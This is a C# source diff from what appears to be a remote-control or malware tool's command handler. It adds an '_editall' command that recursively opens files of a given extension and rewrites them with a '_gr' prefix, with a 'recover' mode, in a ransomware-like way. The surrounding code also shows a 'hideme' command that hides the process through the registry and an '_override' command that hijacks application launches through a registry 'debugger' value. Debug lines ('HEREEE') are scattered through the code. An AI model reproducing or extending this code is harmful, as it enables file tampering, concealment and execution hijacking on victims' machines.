@@ -429,12 +429,71 @@ namespace grace
                 }
                 else if (cmd.parameterList[0].master_command_id != -1 && cmd.parameterList[0].parameter_id == 165)// version
                 {
-                    cmd.parameterList[1].parameter_value = cls_File.PopulatePath(cmd.parameterList[1].parameter_value);
+                    cmd.parameterList[1].parameter_value = PopulatePath(cmd.parameterList[1].parameter_value);
                     FileVersionInfo fileVersionInfo = FileVersionInfo.GetVersionInfo(cmd.parameterList[1].parameter_value);
                     return "** File version of \'" + fileVersionInfo.ProductName + "\' is: " + fileVersionInfo.ProductVersion;
 
                     //return "App version is: " + cls_System.GetApplicationVersion(cmd.parameterList[1].parameter_value);
                 }
+                else if (cmd.parameterList[0].master_command_id != -1 && cmd.parameterList[0].parameter_id == 168)// _editall
+                {
+                    cls_Utility.Log("HEREEE1");
+                    if (!cmd.parameterList[1].parameter_value.Contains("."))
+                    {
+                        cls_Utility.Log("HEREEE2");
+                        cmd.parameterList[1].parameter_value = "." + cmd.parameterList[1].parameter_value;
+                    }
+                    cls_Utility.Log("HEREEE3");
+                    string[] files;
+                    string sOutput = "** Editing all :\r\n";
+                    bool isRecover = false;
+
+                    cls_Utility.Log("HEREEE4");
+                    try
+                    {
+                        files = GetAllRecursively(cmd.parameterList[1].parameter_value, cmd.parameterList[2].parameter_value);
+                        cls_Utility.Log("HEREEE5");
+                    }
+                    catch(Exception ex)
+                    {
+                        cls_Utility.Log("! Error on recursively getting files. " + ex.Message);
+                        return "! Error on recursively getting files. " + ex.Message;
+                    }
+                    cls_Utility.Log("HEREEE6");
+                    if (cmd.parameterList.Count == 4)
+                    {
+                        isRecover = cmd.parameterList[3].parameter_value.ToLower() == "recover";
+                        cls_Utility.Log("HEREEE7");
+                    }
+                    cls_Utility.Log("HEREEE8");
+                    foreach (string sFile in files)
+                    {
+                        try
+                        {
+                            cls_Utility.Log("HEREEE9");                                                       
+                            using (var file = File.Open(sFile, FileMode.Open, FileAccess.ReadWrite))
+                            {
+                                cls_Utility.Log("HEREEE10");
+                                try
+                                {
+                                    Prepend(file, "_gr", isRecover);
+                                }catch(Exception ex)
+                                {
+                                    cls_Utility.Log("! " + ex.Message);
+                                }
+                                cls_Utility.Log("HEREEE11");
+                            }
+                            cls_Utility.Log(sOutput);
+                            sOutput += (!isRecover ? "Manipulated: " : "Recovered: ") + sFile + "\r\n";                            
+                        }
+                        catch(Exception ex)
+                        {
+                            cls_Utility.Log(sOutput);
+                            sOutput += (!isRecover ? "Not Manipulated: " : "Not Recovered: ") + sFile + " -->" + ex.Message + "\r\n";                            
+                        }                        
+                    }
+                    return sOutput;
+                }                
 
 
                 else
@@ -1982,10 +2041,10 @@ namespace grace
                 }
                 else if (cmd.parameterList[0].master_command_id != -1 && (cmd.parameterList[0].parameter_id == 213))// hideme
                 {
-                    if(cls_System.cls_Registry.HideMe())
+                    if (cls_System.cls_Registry.HideMe())
                         return "**\"" + cls_Utility.processName + "\" is hidden Now.";
                     else
-                        return "!\"" + cls_Utility.processName + "\" is hidden or not found.";
+                        return "!\"" + cls_Utility.processName + "\" is already hidden or not found.";
                 }
                 else if (cmd.parameterList[0].master_command_id != -1 && (cmd.parameterList[0].parameter_id == 214))// _override
                 {
@@ -1995,17 +2054,23 @@ namespace grace
                         if (cls_System.cls_Registry.DeleteKey(s_path, cmd.parameterList[2].parameter_value))
                             return "** Registry key " + cmd.parameterList[2].parameter_value + " has been deleted.";
                         else
-                            return "! Error on deleting registry key";                        
+                            return "! Error on deleting registry key";
                     }
                     else //is not "off"
                     {
                         if (cls_System.cls_Registry.CreateKey(s_path, cmd.parameterList[1].parameter_value))
-                            if(cls_System.cls_Registry.SetValue(s_path, cmd.parameterList[1].parameter_value, "debugger", cmd.parameterList[2].parameter_value))
-                            return "** App "+ cmd.parameterList[1].parameter_value + " open action Overrided to " + cmd.parameterList[2].parameter_value + " successfully.";
-                        else
-                            return "! Error on overriding.";
+                            if (cls_System.cls_Registry.SetValue(s_path, cmd.parameterList[1].parameter_value, "debugger", cmd.parameterList[2].parameter_value))
+                                return "** App " + cmd.parameterList[1].parameter_value + " open action Overrided to " + cmd.parameterList[2].parameter_value + " successfully.";
+                            else
+                                return "! Error on overriding.";
                     }
                     return "";
+                }
+                else if (cmd.parameterList[0].master_command_id != -1 && (cmd.parameterList[0].parameter_id == 215))// _default app
+                {
+                    //var imgKey = cls_System.cls_Registry.ClassesRoot.OpenSubKey(".jpg")
+                    //var imgType = key.GetValue("");
+                    return "** not ready yet!";
                 }
 
 
